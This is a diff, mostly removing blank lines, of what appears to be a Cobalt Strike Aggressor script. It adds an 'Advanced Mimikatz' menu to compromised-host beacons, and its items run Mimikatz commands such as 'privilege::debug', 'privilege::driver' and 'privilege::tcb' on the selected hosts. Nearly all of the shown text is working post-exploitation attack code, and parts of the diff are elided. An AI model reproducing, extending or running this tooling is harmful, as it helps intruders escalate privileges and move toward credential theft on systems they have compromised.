@@ -1,102 +1,22 @@
 ##############################
-
-
-
-
-
-
-
 ##  
-
-
-
-
-
-
-
 ##  Define the popup menu
-
-
-
-
-
-
-
 ##
-
-
-
-
-
-
-
 ##############################
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 popup beacon_top {
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 	menu "Advanced Mimikatz" {
-
-
-
 ##########################################
-
 #########################################
-
 ###
-
 ###
-
 ### Begin Privilege Request Menu and Functions
-
 ###
-
 ###
-
 ###
-
 #########################################
-
 ##########################################
-
-	
-
-
-
 menu "Privilege Requests"{
-
-
-
 item "Debug Privilege"{
-
-
 
 local('$bid');
 
@@ -110,24 +30,11 @@ local('$bid');
 
 }
 
-
-
-
-
 sub debug{
-
 bmimikatz($1, "privilege::debug");
 
 }
-
-
-
-
-
-
-
 item "Driver Privilege"{
-
 local('$bid');
 
 				foreach $bid ($1){
@@ -137,21 +44,12 @@ local('$bid');
 	}
 
 }
-
-
-
-
-
 sub driver{
-
 bmimikatz($1, "privilege::driver");
 
 }
 
-
-
 item "Security Privilege"{
-
 local ('$bid');
 
 				foreach $bid ($1){
@@ -178,10 +76,7 @@ local ('$bid');
 
 }
 
-
-
 sub tcb{
-
 bmimikatz($1, "privilege::tcb");
 
 }
@@ -189,9 +84,6 @@ bmimikatz($1, "privilege::tcb");
 
 
 item "Backup Privilege"{
-
-
-
 local ('$bid');
 
 				foreach $bid ($1){
